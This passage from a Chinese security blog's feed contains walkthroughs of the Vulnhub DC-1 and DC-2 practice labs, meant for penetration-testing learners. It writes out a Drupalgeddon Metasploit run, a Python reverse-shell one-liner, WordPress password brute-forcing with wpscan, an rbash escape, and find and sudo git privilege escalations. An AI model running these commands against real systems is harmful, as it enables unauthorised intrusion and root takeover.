        <content type="html"><![CDATA[<h2 id="0x00-靶场介绍"><a href="#0x00-靶场介绍" class="headerlink" title="0x00 靶场介绍"></a>0x00 靶场介绍</h2><p>这是DC系列靶场的第一个靶场DC1,靶场的渗透目标是穿透目标的web服务，获取到Linux系统的root权限。</p><h2 id="0x01-渗透测试"><a href="#0x01-渗透测试" class="headerlink" title="0x01 渗透测试"></a>0x01 渗透测试</h2><h3 id="0x01扫描主机"><a href="#0x01扫描主机" class="headerlink" title="0x01扫描主机"></a>0x01扫描主机</h3><p>在搭建完靶场后，我们老样子，扫描一下相关的内网主机和相关的端口，使用nmap进行扫描。由于攻击机kali所在的ip为192.168.23.131，那么我们可以尝试对该网段进行扫描，扫描命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sP <span class="token number">192.168</span>.23.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过扫描我们发现，和攻击机kali在同一个网段底下的主机有以下这些：</p><img src="/2023/03/05/Vl-1/d0d767b1d3f6494d8a962c9da1aa0ccb.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/d0d767b1d3f6494d8a962c9da1aa0ccb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>其中，很明显我们可以发现，有一台主机：192.168.23.135，这台主机很可能就是我们的靶机所在的地址。我们再次对其进行端口扫描以及操作系统指纹识别试试看：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sT <span class="token number">192.168</span>.31.135 -O<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/03/05/Vl-1/825ce71368f547e48a8f3bdbc50c1dd9.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/825ce71368f547e48a8f3bdbc50c1dd9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>那么再次经过扫描以后呢，我们发现主机开放了22(ssh)、80(http)、111(rpc)服务，这个主机的OS是Linux，那么我们基本上能够确信是这个主机无疑了。进入web页面看一下，果然到了DC1的主页，而且此时我的wappalyzer插件已经识别出了文件管理系统cms版本为7.0，使用的语言为php，操作系统为debian，web服务器为apache。</p><img src="/2023/03/05/Vl-1/ae2ba0011f1f45e89a2d363334a2a763.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/ae2ba0011f1f45e89a2d363334a2a763.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><h3 id="使用msf框架拿到shell"><a href="#使用msf框架拿到shell" class="headerlink" title="使用msf框架拿到shell"></a>使用msf框架拿到shell</h3><p>那么既然是用的drupal7.0这个版本的cms，就可能存在着版本漏洞，直接使用MSF框架试试看，经过search，发现了下面的这些攻击模块：</p><img src="/2023/03/05/Vl-1/e3d1849a70f24dda91675d9af2b223ba.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/e3d1849a70f24dda91675d9af2b223ba.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>后来经过测试后发现，第三个模块是有作用的，甚至我们通过这个模块可以直接拿到shell，具体的操作命令如下：</p><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">use exploit/multi/http/drupal_drupageddonshow optionsset rhosts 192.168.23.135exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们<img src="/2023/03/05/Vl-1/f4eb9e23c7934e979808af074f17b4f6.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/f4eb9e23c7934e979808af074f17b4f6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><br>便拿到了一个新的handler，输入shell即可进入后台，然后我们在主后台拿到了flag1。</p><img src="/2023/03/05/Vl-1/900894d67f66442398831ab7406f613e.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/900894d67f66442398831ab7406f613e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>通过flag1的提示我们直到作者希望我们去查找这个网站cms的配置文件来获得密码，那么我们需要寻找文件，但是我们发现了通过msf框架获得shell具有缺陷，无法修改所在的文件夹，即这个东西不是一个真正的shell，所以我们可能需要反弹shell来获得更高级的命令行。</p><h3 id="通过python进行shell反弹"><a href="#通过python进行shell反弹" class="headerlink" title="通过python进行shell反弹"></a>通过python进行shell反弹</h3><p>Linux系统一般自带python，可以只用python来配合nc进行反弹shell。</p><p>在本地使用nc进行监听：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后通过服务器执行如下的脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.23.131",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹成功，成功创建了shell：</p><img src="/2023/03/05/Vl-1/20faf50085ee4f6a95828582874332e5.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/20faf50085ee4f6a95828582874332e5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>好的，此时我们就能将其当作常规的terminal进行使用了，我们接下来就要尝试寻找网站的配置文件，通过百度我们直到，drupal的配置文件是在一个settings.php中的，我们寻找这个文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> ./ -name settings.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现在当前目录的./sites/default/settings.php中有这个文件，我们查看一下内容，发现了flag2以及泄露的账户密码，如下：</p><img src="/2023/03/05/Vl-1/2b2cded589fb49128f4af2ae31e6f780.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/2b2cded589fb49128f4af2ae31e6f780.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>我们直接回到web进行登录，但是提示登录失败，难道这个不是web用户的密码么？那应该是……msyql数据库的密码？试试看。</p><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">-</span>dbuser <span class="token operator">-</span>pR0ck3t<span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token keyword">use</span> drupaldb<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>果然直接进去了，我们来到上面的数据库，然后查表：</p><img src="/2023/03/05/Vl-1/c73652cbe7df465c9c3b766f7f27ee83.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/c73652cbe7df465c9c3b766f7f27ee83.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>然后就是痛苦的查表过程，我尝试查看users表中的密码，但是密码都是加密的，无法破解，于是只能另辟蹊径。这时候一个叫node的表吸引了我的注意，我查看了一下，居然发现了flag3!</p><img src="/2023/03/05/Vl-1/7b5f2f0cd5984f218477084d97b7f775.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/7b5f2f0cd5984f218477084d97b7f775.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>从上面来看，flag4应该是一个博客的标题，但是具体存在哪里，我们依然不清楚。那么我们可以使用table_schema这个特殊的表来帮助我们进行查找：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema <span class="token operator">=</span> <span class="token string">"flag4"</span> <span class="token operator">and</span> table_name <span class="token operator">=</span> <span class="token string">"flag3"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是依然无果，很烦了，还是继续找资料吧。后来在百度上找到了更改drupal密码的方法，是这样的：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php ./scripts/password-hash.sh newpassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时候会输出一个hash，然后我们需要替换掉数据库的密码，啊，真烦！</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> users <span class="token keyword">set</span> pass<span class="token operator">=</span><span class="token string">"$S$D7CiVJNiXjmOYSbIW6DJ7f3UUyn4VM3p3bbSm.LbKK.Ylgd.qr.t"</span> <span class="token keyword">where</span> uid<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/03/05/Vl-1/8469b85793dc4d599dbe083dcdc52948.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/8469b85793dc4d599dbe083dcdc52948.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>终于进入后台了，在后台的DashBoard拿到了flag3：</p><img src="/2023/03/05/Vl-1/fb3ffbb364754126832fd5527053ec40.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/fb3ffbb364754126832fd5527053ec40.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>获得提示，让我们回到shell寻找flag4，我查看了passwd文件，发现了flag4</p><img src="/2023/03/05/Vl-1/c39de0396fa8495db00c57ddf99d7b01.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/c39de0396fa8495db00c57ddf99d7b01.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>然后我们需要提权到root进行获得最终的flag</p><h3 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">which</span> <span class="token function">find</span><span class="token function">ls</span> -l /usr/bin/find<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现可以提权的标志</p><img src="/2023/03/05/Vl-1/2b48ca3a6ed949fe884c96228683f46a.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/2b48ca3a6ed949fe884c96228683f46a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>然后使用find运行shell反弹<br>首先查看哪些命令具有root权限标志</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -perm -4000 <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/03/05/Vl-1/0eb98ff801044a3e8066d029b39e23d3.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/0eb98ff801044a3e8066d029b39e23d3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>然后使用find寻找这些文件来反弹root的shell，然后发现最后的flag就在root目录底下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> haha<span class="token function">find</span> -name haha -exec <span class="token string">"/bin/sh"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2023/03/05/Vl-1/e38dd9417aa7459189031001710148ac.png" class="lazyload placeholder" data-srcset="/2023/03/05/Vl-1/e38dd9417aa7459189031001710148ac.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>至此，渗透过程结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次渗透过程挺曲折的，绕了好多弯路，希望以后还是能够多多积累经验，让自己变得更加熟练起来！</p><p><strong>特此声明：本攻略只做学习交流，不要用于任何非法行为，否则后果自负！！！</strong></p>]]></content>
      
      
      <categories>
          
          <category> DC靶场系列教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场攻略 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub_DC系列靶场-DC2攻略</title>
      <link href="/2023/03/01/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC1-%E6%94%BB%E7%95%A5/"/>
      <url>/2023/03/01/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC1-%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="0x1-靶场介绍"><a href="#0x1-靶场介绍" class="headerlink" title="0x1 靶场介绍"></a>0x1 靶场介绍</h3><p>DC-2官网给的介绍是这样的：</p><blockquote><p>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.<br>As with the original DC-1, it’s designed with beginners in mind.<br>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.<br>Just like with DC-1, there are five flags including the final flag.<br>And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.<br>In short, the only flag that really counts, is the final flag.<br>For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.<br>I haven’t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.</p></blockquote><p>靶场搭建方法：<br>直接去官网下载：<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>然后你会得到一个.ova类型的文件，确保你电脑上面安装了vmware，然后双击进行导入，接着把网卡模式设为NAT模式，确保攻击机和靶机处于同一个网段下，能相互进行通信。</p><p>本实验采用的环境:<br>靶机：DC-2<br>攻击机：Kali Linux<br>虚拟环境：Vmware workstation 15.0</p><hr><h3 id="0x2-信息搜集"><a href="#0x2-信息搜集" class="headerlink" title="0x2 信息搜集"></a>0x2 信息搜集</h3><ol><li>搭建完成后扫描内网的主机：<br><img src="https://img-blog.csdnimg.cn/c9dcd864710245ba9112019b96ddf4c5.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/c9dcd864710245ba9112019b96ddf4c5.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="fscan"><br>使用的工具为：fscan ， 通过扫描我们可以发现靶机的地址为:192.168.23.132，靶机开放了80端口，显然是一个web服务了，并且还指出了跳转的url为<a href="http://dc-2/%EF%BC%8C%E9%82%A3%E4%B9%88%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%88%91%E4%BB%AC%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87ip%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E8%AF%95%E8%AF%95%E7%9C%8B%E3%80%82">http://dc-2/，那么接下来我们直接通过ip地址进行访问试试看。</a><br><img src="https://img-blog.csdnimg.cn/2dc75640d34946b8abb22cb6408849e5.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/2dc75640d34946b8abb22cb6408849e5.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="unableconnect"><br>这里出现了第一个坑，居然显示无法连接！我的配置明明是正确的啊！我再次检查了一下虚拟网卡的配置情况，再次确定了配置的正确性。难道是虚拟机不允许用ip地址直接访问？带着这个疑问，我修改了攻击机kali的hosts文件，让他指向靶机的域名dc-2。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nano</span> /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://img-blog.csdnimg.cn/f7d8f199d06b4733bca12619d55edb5b.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/f7d8f199d06b4733bca12619d55edb5b.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="修改hosts"><br>果然就像我猜想的那样子，成功进入了web页面，靶机的网站是一个博客页面，如下图所示。<br><img src="https://img-blog.csdnimg.cn/5d3811f910c54cf5815f675e0b7204f8.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/5d3811f910c54cf5815f675e0b7204f8.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="web"><br>进入页面后，我们继续查看有关信息，发现了一个flag的博客文章，通过描述我们知道这是第一个flag，接下来提示我们使用一个叫cewl的工具来进行密码破解。那么经过这样的描述，后台肯定有密码登录的界面咯！通过Wappalyazer工具，我们很轻松的发现了网站的CMS，如下图所示，网站是用wordpress搭建的，后台使用的语言是php，数据库是mysql。<br><img src="https://img-blog.csdnimg.cn/51fccab4b8494b66ae1f08222bb4944f.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/51fccab4b8494b66ae1f08222bb4944f.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="wapplyazer"><br>既然是wordpress，那么肯定是有管理页面的。我们进入默认的管理页面<a href="http://dc-2/wp-admin/%E8%AF%95%E8%AF%95%E7%9C%8B%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9E%9C%E7%84%B6%E7%9C%8B%E5%88%B0%E4%BA%86%E7%99%BB%E5%BD%95%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82">http://dc-2/wp-admin/试试看，发现果然看到了登录的页面。</a><br><img src="https://img-blog.csdnimg.cn/c0b77c2aea39427eae1b6cfa2bc8eb9d.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/c0b77c2aea39427eae1b6cfa2bc8eb9d.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="login"><br>好的，那么接下来就是密码字典的问题了，通过上面的提示我们可以知道，密码字典是通过叫cewl的工具进行生成的。我在百度上查找了该工具的用法，对网站的进行了密码字典生成。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl -w passwd.txt dc-2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://img-blog.csdnimg.cn/33c3ed78977f486a95ec898c2839e57c.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/33c3ed78977f486a95ec898c2839e57c.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="cewl"></li></ol><hr><h3 id="0x3-渗透测试"><a href="#0x3-渗透测试" class="headerlink" title="0x3 渗透测试"></a>0x3 渗透测试</h3><p>当一切准备就绪后，渗透正式开启。接下来就是进行密码爆破了。由于我们知晓网站使用wordpress搭建的，那么我们可以使用wpsan工具对网站的用户名进行猜解，并且对网站的密码进行爆破。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://dc-2 --enumerate u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/02610b07931f49ff92e3d352513a5d41.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/02610b07931f49ff92e3d352513a5d41.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="user"><br>成功发现了三个用户，分别是admin、jerry、tom，其中admin是管理员用户，其他的是普通用户。使用刚刚生成的字典对用户名的密码进行爆破。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url dc-2 -P /home/kali/passwd.txt -U adminwpscan --url dc-2 -P /home/kali/passwd.txt -U jerrywpscan --url dc-2 -P /home/kali/passwd.txt -U tom<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>经过测试发现成功爆破出了用户名对应的密码<br><img src="https://img-blog.csdnimg.cn/f026309d52d941dfae0e0afba2dc56e8.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/f026309d52d941dfae0e0afba2dc56e8.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="jerry"><br><img src="https://img-blog.csdnimg.cn/6b8597d9f3e647ca8a7abf0291a61a2a.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/6b8597d9f3e647ca8a7abf0291a61a2a.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="tom"><br>但是admin的密码仍然不对，看来只能先进入普通用户的后台了。这里有两个用户，都尝试登录一下，发现了flag在jerry用户的底下。除了获取到flag以外，它提示我们需要登录，那么能不能尝试用ssh登录呢？我尝试使用nmap扫描了一下端口，发现22号端口是关闭的，但是我发现了一个奇怪的7744端口，并且nmap提示了service是ssh！好家伙，这是把端口改了是吧！从7744端口登录。<br><img src="https://img-blog.csdnimg.cn/bc753e033cd94c2692fb8ee8482acac5.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/bc753e033cd94c2692fb8ee8482acac5.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="nmap"><br>经过测试我发现，只有tom用户可以登录ssh，jerry用户默认关闭了远程的ssh登录。<br><img src="https://img-blog.csdnimg.cn/b79ecd3ab66b4fd9b7b3e6096839ba5b.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/b79ecd3ab66b4fd9b7b3e6096839ba5b.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>这里遇到了新的坑，就是tom账户的所有常见命令都被禁用了！最后测试只有vi可以使用，在tom家目录发现了flag3.txt，可以使用vi进行查看。flag3.txt中只有一句话：</p><pre class="line-numbers language-none"><code class="language-none">Poor old Tom is always running after Jerry.Perhaps he should su for all the stress he cause.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>好家伙！这步妥妥暗示着让我提权么，而且是切换到jerry用户进行提权啊。但是su命令被禁用了，怎们进行切换用户呢？后来查百度发现，原来是需要用两个新的命令切换到sh命令行，来恢复被禁用的命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">BASH_CMDS</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span>/bin/sh<span class="token punctuation">;</span>a<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过上述命令应该就能恢复基本命令的使用了，来验证一下，使用cat查看flag3的内容，正常输出。切换到jerry用户，输入密码，成功进入jerry用户账户。<br><img src="https://img-blog.csdnimg.cn/64f6afe8648d41e3ae2542f25f836e60.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/64f6afe8648d41e3ae2542f25f836e60.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="jerry"><br>在jerry用户目录发现了flag4.txt，jerry用户没禁用常用命令，使用cat可以查看flag4的信息。<br><img src="https://img-blog.csdnimg.cn/50de476fda3247be92d0502a54123375.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/50de476fda3247be92d0502a54123375.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="flag4"><br>提示我还有一个flag，需要提权到root用户才能查看。我先用查看一下可以怎样进行提取，输入以下命令查看具有root权限执行的程序。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/3305c92ce191472aa42e013b402ef591.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/3305c92ce191472aa42e013b402ef591.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="sudo"><br>发现了一个git可以无密码使用root命令，那么应该可以借助其进行提权了。git提权要注意，窗口不能太大，不然不能回显出命令行，那么先把ssh的窗口进行缩小，然后输入以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> <span class="token builtin class-name">help</span> config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后输入如下命令完成提权，会显出root命令行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/47eee1a35ecd44ea92355b77880a80e9.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/47eee1a35ecd44ea92355b77880a80e9.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="sh"><br>接着在弹出的root命令行中把root用户的密码更改了，就可以切换到root用户了，成功拿到root权限了，渗透测试完成！<br><img src="https://img-blog.csdnimg.cn/c4ced0b73c5d4a198a6956f12e6c9b48.png#pic_center" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/c4ced0b73c5d4a198a6956f12e6c9b48.png#pic_center" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="root"></p><hr><h3 id="0x4-练习总结"><a href="#0x4-练习总结" class="headerlink" title="0x4 练习总结"></a>0x4 练习总结</h3><ol><li>该靶场为渗透测试提供了很多的思路，能够很好的开拓自己的眼界和方法。</li><li>靶场涉及了git提权、抓取网页密码字典等基本知识。</li></ol><p>OK，就到这里啦！如果你喜欢欢迎关注我！<br>博客：<a href="https://littlewith.github.io/">https://littlewith.github.io/</a><br>个人主页：<a href="https://littlewith.top/">https://littlewith.top/</a><br>不定期更新网络安全、软件开发系列文章！</p>]]></content>
      
      
      <categories>
          
          <category> DC靶场系列教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场攻略 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主页上新！</title>
      <link href="/2023/01/28/%E4%B8%BB%E9%A1%B5%E4%B8%8A%E6%96%B0%EF%BC%81/"/>
      <url>/2023/01/28/%E4%B8%BB%E9%A1%B5%E4%B8%8A%E6%96%B0%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h3 id="小和的个人主页上线啦！"><a href="#小和的个人主页上线啦！" class="headerlink" title="小和的个人主页上线啦！"></a>小和的个人主页上线啦！</h3><img src="/2023/01/28/%E4%B8%BB%E9%A1%B5%E4%B8%8A%E6%96%B0%EF%BC%81/a.png" class="lazyload placeholder" data-srcset="/2023/01/28/%E4%B8%BB%E9%A1%B5%E4%B8%8A%E6%96%B0%EF%BC%81/a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="主页预览"><h5 id="主页网址"><a href="#主页网址" class="headerlink" title="主页网址"></a>主页网址</h5><ul><li><a href="https://home.littlewith.top/">https://home.littlewith.top/</a></li><li><a href="https://littlewith.top/">https://littlewith.top/</a></li></ul><h5 id="欢迎造访！"><a href="#欢迎造访！" class="headerlink" title="欢迎造访！"></a>欢迎造访！</h5>]]></content>
      
      
      <categories>
          
          <category> Welcome </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自己编译安装openwrt系统</title>
      <link href="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/</url>
      
